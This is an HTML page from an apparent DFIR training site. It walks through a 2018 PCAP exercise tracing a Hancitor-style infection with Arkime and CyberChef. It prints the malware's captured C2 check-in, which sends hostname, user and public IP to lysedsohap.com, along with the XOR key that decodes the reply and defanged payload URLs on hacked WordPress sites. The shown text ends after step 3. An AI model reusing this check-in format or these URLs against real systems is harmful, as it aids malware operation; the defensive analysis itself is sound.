@@ -1,0 +1,1866 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#f4ead1">
+  <title>Night Dew — Hancitor check-ins to follow-up downloads, credential exfil and a self-signed TLS C2 · Traffic Analysis</title>
+  <script src="../theme.js"></script>
+  <link rel="stylesheet" href="../styles.css">
+  <link rel="stylesheet" href="./guide.css">
+  <script src="../app.js" defer></script>
+</head>
+<body data-title="handbookCase8Title">
+  <a class="skip-link" href="#main" data-copy="skip">Skip to content</a>
+  <header class="topbar">
+    <div class="frame topbar-inner">
+      <a class="brand" href="../index.html#overview">
+        <span class="brand-mark" aria-hidden="true"><i></i><i></i><i></i></span>
+        <span data-copy="brand">Traffic Analysis</span>
+      </a>
+      <div class="header-actions">
+        <a class="github" href="https://github.com/DFIDwiz-sketch/traffic_analysis">GitHub</a>
+        <div class="language" role="group" aria-label="Language" data-label="language">
+          <button type="button" lang="en" data-language="en" aria-pressed="true">EN</button>
+          <button type="button" lang="ko" data-language="ko" aria-pressed="false">한국어</button>
+        </div>
+        <button class="theme-toggle" type="button" data-theme-toggle data-label="darkTheme"
+                aria-label="Dark theme" aria-pressed="false" title="Dark theme">
+          <span class="theme-icon" aria-hidden="true"></span>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <main class="frame" id="main" tabindex="-1">
+    <header class="guide-header">
+      <a class="guide-back" href="../index.html#investigations" data-copy="backToInvestigations">Back to investigations</a>
+      <p class="eyebrow">DFIR Handbook</p>
+      <h1 data-copy="handbookCase8Title">Night Dew — Hancitor check-ins to follow-up downloads, credential exfil and a self-signed TLS C2</h1>
+    </header>
+    <div class="guide-layout">
+      <nav class="guide-toc" aria-labelledby="guide-toc-title">
+        <h2 id="guide-toc-title" data-copy="guideContents">On this page</h2>
+<ul lang="en" data-guide-language>
+<li><a href="#en-summary">Case summary</a></li>
+<li><a href="#en-answers">Answers at a glance</a></li>
+<li><a href="#en-prep">Step 0 — Preparation: the PCAP and the Arkime time range</a></li>
+<li><a href="#en-baseline">Step 1 — Baseline: which devices and users are there</a></li>
+<li><a href="#en-external">Step 2 — External destinations: who did it talk to, and how much</a></li>
+<li><a href="#en-checkin">Step 3 — HTTP check-ins: what was sent to lysedsohap[.]com</a></li>
+<li><a href="#en-exfil">Step 5 — Exfiltration: two binary POSTs</a></li>
+<li><a href="#en-tls-c2">Step 6 — TLS C2: robwassotdint[.]ru and a self-signed certificate</a></li>
+<li><a href="#en-timeline">Step 7 — Timeline: putting the events in order</a></li>
+<li><a href="#en-snort">Step 8 — Snort rules and test results</a></li>
+<li><a href="#en-query-sheet">Copy-ready queries</a></li>
+<li><a href="#en-lessons">Lessons</a></li>
+<li><a href="#en-references">References</a></li>
+</ul>
+<ul lang="ko" data-guide-language hidden>
+<li><a href="#ko-summary">사례 요약</a></li>
+<li><a href="#ko-answers">한눈에 보는 답</a></li>
+<li><a href="#ko-prep">0단계 — 준비: PCAP과 Arkime 시간 범위</a></li>
+<li><a href="#ko-baseline">1단계 — 베이스라인: 어떤 장치와 사용자가 있나</a></li>
+<li><a href="#ko-external">2단계 — 외부 목적지 정리: 밖으로 누구와 얼마나 통신했나</a></li>
+<li><a href="#ko-checkin">3단계 — HTTP 체크인: lysedsohap[.]com에 무엇을 보냈나</a></li>
+<li><a href="#ko-exfil">5단계 — 정보 유출: 바이너리 POST 2개</a></li>
+<li><a href="#ko-tls-c2">6단계 — TLS C2: robwassotdint[.]ru와 자체 서명 인증서</a></li>
+<li><a href="#ko-timeline">7단계 — 타임라인: 사건을 시간 순서로 잇기</a></li>
+<li><a href="#ko-snort">8단계 — Snort 룰과 테스트 결과</a></li>
+<li><a href="#ko-query-sheet">복사용 쿼리 모음</a></li>
+<li><a href="#ko-lessons">배운 점</a></li>
+<li><a href="#ko-references">참고</a></li>
+</ul>
+      </nav>
+      <article class="guide-article handbook-article">
+<div lang="en" data-guide-language>
+<section id="en-summary"><h2>Case summary</h2><p>The first pass traces HTTP check-ins, follow-on file transfers and a self-signed TLS channel. The linked Traffic Analysis walkthrough documents the separate Netlogon RPC evidence, including the request burst and the later TCP close.</p>
+<p><a href="https://dfidwiz-sketch.github.io/dfir-handbook/blueteam/investigations/night-dew-hancitor-pony-zeus-panda-tls-c2/">DFIR Handbook original</a></p>
+<p><a href="2018-05-11-night-dew-netlogon-rpc.html">Traffic Analysis · Night Dew Netlogon packet timing</a></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col"></th>
+<th scope="col"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Evidence</strong></td>
+<td>One PCAP <code>2018-05-11-traffic-analysis-exercise.pcap</code> — 2018-05-11 02:06:51 – 02:49:40 UTC (42 min 49 s), 7,295 packets, SHA256 <code>b2c8d0fe…13e51e</code></td>
+</tr>
+<tr>
+<td><strong>Source</strong></td>
+<td>malware-traffic-analysis.net 2018-05-11 exercise "Night Dew"</td>
+</tr>
+<tr>
+<td><strong>Environment</strong></td>
+<td>Closed network (no VirusTotal, no OSINT). Arkime web UI, CyberChef, tshark and Snort 2.9 on the analysis VM</td>
+</tr>
+<tr>
+<td><strong>Deliverables</strong></td>
+<td>Baseline, analysis of the malicious activity, CyberChef decode, Snort rules that find the traffic again (tested)</td>
+</tr>
+<tr>
+<td><strong>Related pages</strong></td>
+<td><a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/arkime/search-syntax/">Arkime search syntax</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/beaconing-c2/">Beaconing &amp; C2</a> · <a href="handbook-pcap-lab-06-invoice-macro-c2.html">PCAP Lab 06 — same Hancitor style</a> · <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">Previous case: Back to the Present</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section>
+<h2 id="en-answers">Answers at a glance</h2>
+<p><strong>Bottom line:</strong> from 2018-05-11 02:08:04 UTC CHICAGO-7FA3-PC (10.0.14.129, user faith.hoffman) was infected with a Hancitor-style downloader. It checked in to its C2 every 2 minutes, downloaded three more pieces of malware and sent two POSTs that most likely carried stolen credentials. It then beaconed every 5 minutes to a Zeus Panda Banker-style HTTPS C2.</p>
+<hr>
+</section>
+<section>
+<h2 id="en-prep">Step 0 — Preparation: the PCAP and the Arkime time range</h2>
+<p><strong>Goal:</strong> record what you are analysing and make sure Arkime is showing the whole PCAP.</p>
+<p><strong>Exercise scenario:</strong> on Friday 2018-05-11 (UTC) an alert fired for a possibly infected Windows host and a colleague pulled the related traffic. Analyse it and write an incident report.</p>
+<p><strong>PCAP facts (analysis VM, <code>capinfos</code> and <code>sha256sum</code>):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>File        2018-05-11-traffic-analysis-exercise.pcap
+SHA256      b2c8d0fed6765dc4d2036fae6587a3bac9c27184a3032bd3899eefac4d13e51e
+Packets     7295
+First       2018-05-11 02:06:51 UTC
+Last        2018-05-11 02:49:40 UTC
+Duration    about 42 min 49 s
+</code></pre></div></div>
+<ul>
+<li>The hash proves "the file I analysed is exactly this file". Record it next to the evidence location in the report so the next analyst can check they have the same file.</li>
+<li><code>capinfos</code> may print times in the computer's local time zone. Prefix it with <code>TZ=UTC</code> (<code>TZ=UTC capinfos file</code>) to get UTC. (In Adelaide time it shows 11:36:51 — 9 h 30 min later.)</li>
+</ul>
+<p><strong>Arkime time range:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Start     2018/05/11 02:06:51
+End       2018/05/11 02:50:00
+Bounding  Last Packet
+</code></pre></div></div>
+<ul>
+<li><strong>Start / End</strong> — the search window. The last packet is at 02:49:40; setting the end <strong>a little wider</strong> (02:50:00) avoids losing sessions at the very end.</li>
+<li><strong>Bounding: Last Packet</strong> — a session is shown if its <strong>last packet</strong> falls inside the window. With a wide enough window every bounding option returns everything.</li>
+<li>Keep Arkime showing UTC (Settings → Timezone Format → UTC). All report times are UTC.</li>
+</ul>
+<p><strong>Where to look:</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Tab</th>
+<th scope="col">Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Sessions</strong></td>
+<td>One session (connection) per row. Expand a row for details and packet content</td>
+</tr>
+<tr>
+<td><strong>SPIView</strong></td>
+<td>Values and counts per field. The number in brackets <code>(54)</code> is the <strong>session count</strong></td>
+</tr>
+<tr>
+<td><strong>Connections</strong></td>
+<td>Graph of who talked to whom</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>Click any value to get an <strong>and</strong> / <strong>exclude</strong> menu that adds it to the search expression — fewer typos than typing the expression yourself.</p>
+<hr>
+</section>
+<section>
+<h2 id="en-baseline">Step 1 — Baseline: which devices and users are there</h2>
+<p><strong>Result:</strong> there is only one internal PC, 10.0.14.129 (CHICAGO-7FA3-PC, user faith.hoffman). 10.0.14.3 is the domain controller (DC) and 10.0.14.1 is the gateway. Knowing the baseline first is what makes the "odd" things stand out later.</p>
+<h3 id="en-overview">1-1. The big picture</h3>
+<p><strong>Query:</strong> <strong>clear</strong> the search box and press Search → <strong>SPIView</strong> → <strong>general</strong> section.</p>
+<p><strong>Result (Arkime screen):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Src IP     10.0.14.129 (212)  10.0.14.1 (3)  0.0.0.0 (1)
+Dst IP     10.0.14.3 (91)  185.174.175.14 (54)  10.0.14.1 (23)  185.43.223.6 (23)
+           224.0.0.252 (5)  255.255.255.255 (4)  10.0.14.129 (3)  10.0.14.255 (3)
+           224.0.0.22 (3)  239.255.255.250 (3)  111.90.144.30 (1)  173.223.52.18 (1)
+           184.72.249.110 (1)  216.58.193.68 (1)
+Protocols  tcp (131) udp (82) tls (55) dns (34) http (26) krb5 (25) ldap (12)
+           dhcp (9) dcerpc (7) smb (6) llmnr (5) igmp (3) ntp (3) ssdp (3)
+</code></pre></div></div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Only one internal PC starts sessions: 10.0.14.129</strong> (212). The 3 from 10.0.14.1 are DHCP server replies; 0.0.0.0 is the PC before it has an IP.</li>
+<li><strong>Nothing came in from outside first.</strong> There is no external IP in Src IP.</li>
+<li>There are only six external IPs. Two stand out by count: 185.174.175.14 (54) and 185.43.223.6 (23). A normal user rarely hits the same external IP dozens of times in 42 minutes.</li>
+<li><code>krb5</code>, <code>ldap</code>, <code>smb</code> and <code>dcerpc</code> mean a <strong>Windows domain (Active Directory)</strong>. That differs from <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">Back to the Present</a> (a home PC behind a router).</li>
+</ul>
+<h3 id="en-dhcp">1-2. Hostname and MAC (DHCP)</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>protocols == dhcp
+</code></pre></div></div>
+<ul>
+<li><code>protocols</code> — the list of protocols Arkime identified.</li>
+<li><code>== dhcp</code> — keep DHCP sessions only.</li>
+</ul>
+<p>→ <strong>SPIView</strong> → <strong>dhcp</strong> section (if it is not shown, <strong>Load All</strong> at the top right).</p>
+<p><strong>Result (values in the packets):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Host        Chicago-7fa3-PC
+Client MAC  00:1a:92:06:5c:7b
+Client OUI  ASUSTek COMPUTER INC.
+Type        REQUEST, INFORM, ACK
+Vendor      MSFT 5.0
+</code></pre></div></div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Host = Chicago-7fa3-PC</strong> — the computer name the PC announced when it asked for an IP.</li>
+<li><strong>MAC = 00:1a:92:06:5c:7b, OUI = ASUSTek</strong> — the network card's unique number. An IP can change but a MAC rarely does, so it is the host operator's most reliable way to find the machine.</li>
+<li><strong>MSFT 5.0</strong> — the label the Windows (Vista and later) DHCP client adds.</li>
+<li><strong>REQUEST from 0.0.0.0 at 02:06:51</strong> — the PC was starting up or rejoining the network and asked for its previous IP (10.0.14.129) again. This matters: <strong>the capture starts right after the PC started</strong> (<a href="#en-timeline">step 7 timeline</a>).</li>
+<li><strong>INFORM</strong> — the PC already has an IP and asks only for other settings. The <strong>REQUESTs at 02:21:51 and 02:36:51</strong> are 15-minute lease renewals. All normal.</li>
+</ul>
+<h3 id="en-kerberos">1-3. User account and domain (Kerberos)</h3>
+<p><strong>Goal:</strong> in a Windows domain, logging on means asking the DC for Kerberos "tickets". Those requests carry the <strong>account name</strong>.</p>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>protocols == krb5
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>krb5</strong> section.</p>
+<p><strong>Result:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>cname   CHICAGO-7FA3-PC$   chicago-7fa3-pc$   faith.hoffman
+realm   NIGHTDEW.ORG
+sname   krbtgt/NIGHTDEW.ORG   cifs/nightdew-dc.nightdew.org
+        ldap/Nightdew-DC.nightdew.org   host/chicago-7fa3-pc.nightdew.org
+</code></pre></div></div>
+<ul>
+<li><code>cname</code> — the <strong>account</strong> asking for a ticket. <code>realm</code> — the <strong>domain</strong>. <code>sname</code> — the <strong>service</strong> it wants.</li>
+</ul>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Names ending in <code>$</code> are computer accounts</strong> (<code>CHICAGO-7FA3-PC$</code>). PCs log on to the domain too; do not confuse them with people.</li>
+<li><strong>faith.hoffman, with no <code>$</code>, is the person (user) account.</strong> Expanding the session shows the ticket request at <strong>02:07:29 UTC</strong> — the moment the user logged on.</li>
+<li><strong>Domain = NIGHTDEW.ORG</strong>, DC name = <strong>Nightdew-DC.nightdew.org</strong>.</li>
+<li><code>cifs</code> (file sharing), <code>ldap</code> (directory lookups) and <code>host</code> are what logon and group policy normally use. The only file read over SMB is a group policy file (<code>sysvol\...\gpt.ini</code>). This is a <strong>normal domain logon</strong>.</li>
+</ul>
+<h3 id="en-dc">1-4. Confirming the DC (DNS)</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>protocols == dns
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → the <strong>dns</strong> section's <strong>Host</strong> (name asked) and <strong>IP</strong> (answer), plus <strong>Dst IP</strong> in general.</p>
+<p><strong>What to look for:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Dst IP  10.0.14.3 (34)        ← the server receiving DNS questions
+Host    _ldap._tcp.dc._msdcs.nightdew.org   → 10.0.14.3
+        nightdew-dc.nightdew.org            → 10.0.14.3
+</code></pre></div></div>
+<ul>
+<li><code>_ldap._tcp.dc._msdcs.&lt;domain&gt;</code> is how Windows asks <strong>"where is our domain's DC?"</strong>. The answer is 10.0.14.3, so <strong>10.0.14.3 = DC</strong>.</li>
+<li>The DNS server is also 10.0.14.3 (the DC). In a domain the DC usually runs DNS.</li>
+<li>The PC never asked any other DNS server directly. The previous case's bypass (TCP DNS to external resolvers) is <strong>not</strong> present here.</li>
+</ul>
+<h3 id="en-baseline-summary">Baseline summary</h3>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">IP</th>
+<th scope="col">Name</th>
+<th scope="col">MAC (vendor)</th>
+<th scope="col">Role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10.0.14.129</td>
+<td>CHICAGO-7FA3-PC</td>
+<td>00:1a:92:06:5c:7b (ASUSTek)</td>
+<td>User PC, Windows 7 x64, faith.hoffman</td>
+</tr>
+<tr>
+<td>10.0.14.3</td>
+<td>Nightdew-DC.nightdew.org</td>
+<td>00:1e:4f:88:3f:a6 (Dell)</td>
+<td>DC + DNS</td>
+</tr>
+<tr>
+<td>10.0.14.1</td>
+<td>—</td>
+<td>00:02:16:47:96:ef (Cisco)</td>
+<td>Gateway + DHCP</td>
+</tr>
+</tbody>
+</table>
+</div>
+<hr>
+</section>
+<section>
+<h2 id="en-external">Step 2 — External destinations: who did it talk to, and how much</h2>
+<p><strong>Result:</strong> of six external IPs, three are suspicious (185.43.223.6, 111.90.144.30, 185.174.175.14) and one (api.ipify[.]org) is a legitimate service that the malware used. The other two are normal Windows and Google traffic.</p>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
+</code></pre></div></div>
+<ul>
+<li><code>ip.src == 10.0.14.129</code> — sessions <strong>started</strong> by the suspect PC.</li>
+<li><code>&amp;&amp;</code> — AND; both conditions must be true.</li>
+<li><code>ip.dst != [...]</code> — destination matches <strong>none</strong> of the list.</li>
+<li><code>10.0.0.0/8</code> — all internal addresses. <code>224.0.0.0/4</code> — multicast (LLMNR, SSDP and other local broadcasts). <code>255.255.255.255</code> — broadcast. Removing these leaves <strong>only traffic to the internet</strong>.</li>
+</ul>
+<p>→ Sort the <strong>Sessions</strong> tab by <strong>Dst IP</strong>, or read SPIView's general (Dst IP), http (Hostname) and tls sections together. For bytes, add the <strong>Src Bytes / Dst Bytes</strong> columns in the Sessions tab (right-click a column header → add column).</p>
+<p><strong>Result (summary):</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Dst IP</th>
+<th scope="col">Port</th>
+<th scope="col">Name (DNS / Host / SNI)</th>
+<th scope="col">Sessions</th>
+<th scope="col">First – last (UTC)</th>
+<th scope="col">Sent / received</th>
+<th scope="col">Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>185.174.175.14</td>
+<td>443</td>
+<td>robwassotdint[.]ru</td>
+<td>54</td>
+<td>02:10:16 – 02:45:46</td>
+<td>~120 KB / 1.65 MB</td>
+<td><strong>Malicious</strong> (<a href="#en-tls-c2">step 6</a>)</td>
+</tr>
+<tr>
+<td>185.43.223.6</td>
+<td>80</td>
+<td>lysedsohap[.]com</td>
+<td>23</td>
+<td>02:08:04 – 02:48:25</td>
+<td>~16 KB / 12 KB</td>
+<td><strong>Malicious</strong> (<a href="#en-checkin">step 3</a>, <a href="#en-exfil">step 5</a>)</td>
+</tr>
+<tr>
+<td>111.90.144.30</td>
+<td>80</td>
+<td>wansaiful[.]com</td>
+<td>1</td>
+<td>02:08:05 – 02:08:15</td>
+<td>~5 KB / 264 KB</td>
+<td><strong>Malicious</strong> (step 4)</td>
+</tr>
+<tr>
+<td>184.72.249.110</td>
+<td>80</td>
+<td>api.ipify[.]org</td>
+<td>1</td>
+<td>02:08:04</td>
+<td>0.5 KB / 0.5 KB</td>
+<td>Legitimate service, <strong>used by the malware</strong></td>
+</tr>
+<tr>
+<td>216.58.193.68</td>
+<td>443</td>
+<td>www.google.com</td>
+<td>1</td>
+<td>02:20:16</td>
+<td>3.7 KB / 84 KB</td>
+<td>Looks normal</td>
+</tr>
+<tr>
+<td>173.223.52.18</td>
+<td>80</td>
+<td>www.msftncsi.com</td>
+<td>1</td>
+<td>02:07:02</td>
+<td>0.4 KB / 0.5 KB</td>
+<td>Normal (Windows connectivity check)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>185.174.175.14 — 54 sessions, 1.65 MB received.</strong> The PC kept going back to one server for 35 minutes, and <code>robwassotdint[.]ru</code> is a meaningless string.</li>
+<li><strong>185.43.223.6 — 23 sessions.</strong> Steady contact for 40 minutes; <code>lysedsohap[.]com</code> also looks random. More sent (16 KB) than received (12 KB) is the opposite of normal browsing.</li>
+<li><strong>111.90.144.30 — 264 KB received in one session.</strong> Something was downloaded.</li>
+<li><strong>api.ipify[.]org</strong> — a legitimate "what is my public IP?" service. A corporate PC rarely asks it, but <strong>malware often does right after infection</strong>. Look at the times: ipify at 02:08:04, lysedsohap[.]com 0.5 s later, wansaiful[.]com 1 s later. One chain.</li>
+<li><strong>www.google.com</strong> — Google's genuine certificate (Google Internet Authority G3), one session only. Not enough to judge, so it stays out of the report.</li>
+<li><strong>www.msftncsi.com/ncsi.txt</strong> — Windows' "is the internet reachable?" check, User-Agent <code>Microsoft NCSI</code>. Normal.</li>
+</ul>
+<div class="admonition tip">
+<p class="admonition-title">Spotting suspicious external IPs quickly</p>
+<ol>
+<li>Many sessions to a single destination (beacon candidate)</li>
+<li>A domain name that is a random string</li>
+<li>A large download in one session</li>
+<li>Different external IPs appearing <strong>within seconds of each other</strong> (one program's sequence)</li>
+</ol>
+</div>
+<hr>
+</section>
+<section>
+<h2 id="en-checkin">Step 3 — HTTP check-ins: what was sent to lysedsohap[.]com</h2>
+<p><strong>Result:</strong> the PC sent its own details (hostname, domain\user, public IP, OS) to <code>lysedsohap[.]com/4/forum.php</code> <strong>21 times, about every 2 minutes</strong>. The first reply held encrypted "download from these URLs" commands. A classic <strong>downloader (Hancitor-style) C2</strong>.</p>
+<h3 id="en-http-overview">3-1. All HTTP at once</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>protocols == http
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>http</strong> section.</p>
+<p><strong>Result (Arkime screen):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Hostname   lysedsohap.com (23)  api.ipify.org (1)  wansaiful.com (1)  www.msftncsi.com (1)
+URI        lysedsohap.com/4/forum.php (21)  lysedsohap.com/mlu/forum.php (1)
+           lysedsohap.com/d2/about.php (1)  api.ipify.org/ (1)
+           wansaiful.com/wp-content/plugins/easy-media-download/1, /2, /3
+           www.msftncsi.com/ncsi.txt (1)
+Useragent  Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko (23)
+           Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; ...) (2)
+           Microsoft NCSI (1)
+http.request.content-type   application/x-www-form-urlencoded (21)  application/octet-stream (2)
+http.request.referer        No data for this field
+http.response.server        nginx/1.10.2 (23)  Cowboy (1)  nginx (1)
+</code></pre></div></div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>23 of the 26 HTTP sessions go to lysedsohap[.]com</strong>, 21 of them to the same path <code>/4/forum.php</code>. The same thing repeated to the same URL suggests a beacon.</li>
+<li><strong>There is no Referer at all.</strong> A person clicking a link in a browser normally sends a Referer (the page they came from). A program <strong>knew the URL and requested it directly</strong>.</li>
+<li><strong>An IE11-looking User-Agent proves nothing.</strong> A program can write any User-Agent it likes. The two <code>MSIE 7.0</code> entries (a 2007 browser) next to IE11 on a Windows 7 PC are odd in themselves (<a href="#en-exfil">step 5</a>).</li>
+<li><strong>Two kinds of request body</strong> — <code>x-www-form-urlencoded</code> (21) = text name=value pairs; <code>octet-stream</code> (2) = binary. Look at them separately.</li>
+</ul>
+<h3 id="en-first-checkin">3-2. Opening the first check-in</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com &amp;&amp; http.uri == *4/forum.php*
+</code></pre></div></div>
+<ul>
+<li><code>host.http</code> — the HTTP Host name.</li>
+<li><code>http.uri == *4/forum.php*</code> — <code>*</code> means "any characters"; URIs containing <code>4/forum.php</code>. (Arkime stores the URI with the host in front: <code>lysedsohap.com/4/forum.php</code>.)</li>
+</ul>
+<p>→ The <strong>Sessions</strong> tab shows 21 rows. <strong>Sort by Start Time</strong>, expand the top one (02:08:04) with ⊕, and choose the <strong>natural</strong> (or ascii) view in the packet pane.</p>
+<p><strong>Result (request):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>POST /4/forum.php HTTP/1.1
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
+Host: lysedsohap.com
+Content-Length: 123
+Cache-Control: no-cache
+
+GUID=10412771973665002240&amp;BUILD=09fhx05&amp;INFO=CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman&amp;IP=173.236.56.182&amp;TYPE=1&amp;WIN=6.1(x64)
+</code></pre></div></div>
+<p><strong>The body, piece by piece:</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Name</th>
+<th scope="col">Value</th>
+<th scope="col">Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>GUID</code></td>
+<td>10412771973665002240</td>
+<td>Unique ID per infected PC; how the attacker tells victims apart</td>
+</tr>
+<tr>
+<td><code>BUILD</code></td>
+<td>09fhx05</td>
+<td>Malware build (campaign) name</td>
+</tr>
+<tr>
+<td><code>INFO</code></td>
+<td>CHICAGO-7FA3-PC @ NIGHTDEW\faith.hoffman</td>
+<td><strong>hostname @ domain\user</strong> — confirms the victim host and user from traffic alone</td>
+</tr>
+<tr>
+<td><code>IP</code></td>
+<td>173.236.56.182</td>
+<td>The <strong>public IP</strong> that api.ipify[.]org just returned (the network's internet-facing address)</td>
+</tr>
+<tr>
+<td><code>TYPE</code></td>
+<td>1</td>
+<td>Internal malware value</td>
+</tr>
+<tr>
+<td><code>WIN</code></td>
+<td>6.1(x64)</td>
+<td>Windows version 6.1 = <strong>Windows 7, 64-bit</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>This explains the api.ipify[.]org call.</strong> ipify's answer (173.236.56.182) went to the C2 0.5 s later, tying both sessions into one action without guesswork.</li>
+<li><strong>The body alone is enough for a malicious verdict.</strong> Legitimate software does not send domain\user and the public IP to a random-named external server.</li>
+</ul>
+<h3 id="en-cyberchef">3-3. Decoding the first reply in CyberChef</h3>
+<p><strong>Result (response):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>HTTP/1.1 200 OK
+Server: nginx/1.10.2
+Content-Type: text/html
+Transfer-Encoding: chunked
+X-Powered-By: PHP/5.4.45
+
+59c
+GKPTARZAEg4OCkBVVQ0bFAkbExwPFlQZFRdVDQpXGRUUDh8UDlUKFg8dExQJVR8bCQNXFx8e...
+0
+</code></pre></div></div>
+<ul>
+<li><code>Transfer-Encoding: chunked</code> — the body is sent in chunks. <code>59c</code> is the next chunk's size (hex 0x59c = 1436 bytes) and the final <code>0</code> means "end". <strong>They are not part of the body — leave them out when copying.</strong></li>
+<li>The body uses only <code>A-Z a-z 0-9 + /</code>: it looks like <strong>Base64</strong>.</li>
+</ul>
+<p><strong>CyberChef recipe:</strong></p>
+<ol>
+<li>Paste only the text between <code>59c</code> and <code>0</code> into Input. (If the packet split it across lines, remove the line breaks.)</li>
+<li><strong>From Base64</strong> — turns the Base64 back into bytes. Still unreadable.</li>
+<li><strong>XOR</strong> — Key <code>7a</code>, format <strong>HEX</strong>. XORs every byte with 0x7A, giving the original text.</li>
+</ol>
+<p><strong>Result (CyberChef Output, wrapped for reading):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>b..{l:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/1
+       |hxxp://www[.]victoryoutreachvallejo[.]com/wp-content/plugins/regenerate-thumbnails/includes/1
+       |hxxp://medleysoup[.]com/wp-content/plugins/comicpress-manager/1
+       |hxxp://radiantheartcoaching[.]com/blog/wp-content/themes/twentyten/1
+       |hxxp://hdmicablereviews[.]com/wp-content/plugins/google-sitemap-generator/1}
+    {b:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/2|... (same 5 sites, /2)}
+    {r:hxxp://wansaiful[.]com/wp-content/plugins/easy-media-download/3|... (same 5 sites, /3)}
+</code></pre></div></div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li>The first few bytes (<code>b..</code>) are meaningless; the <strong>commands</strong> follow, in three <code>{letter:URL|URL|...}</code> blocks.</li>
+<li>Each command lists <strong>the same file on 5 servers</strong> — a fallback list in case one is blocked. This PC <strong>got everything from the first, wansaiful[.]com</strong>, and never contacted the other four. Record those four as IOCs to hunt for on other networks.</li>
+<li>Every URL is in a <strong>WordPress plugin/theme folder</strong> (<code>wp-content/plugins/...</code>) — the typical shape of malware hidden on hacked legitimate WordPress sites.</li>
+<li><code>l</code>, <code>b</code> and <code>r</code> are command letters that say how to run each downloaded file. Public analyses describe Hancitor using such letters to choose an execution method (run directly, inject into another process, …). The exact meaning per letter needs host confirmation, so the report says only "3 download commands".</li>
+</ul>
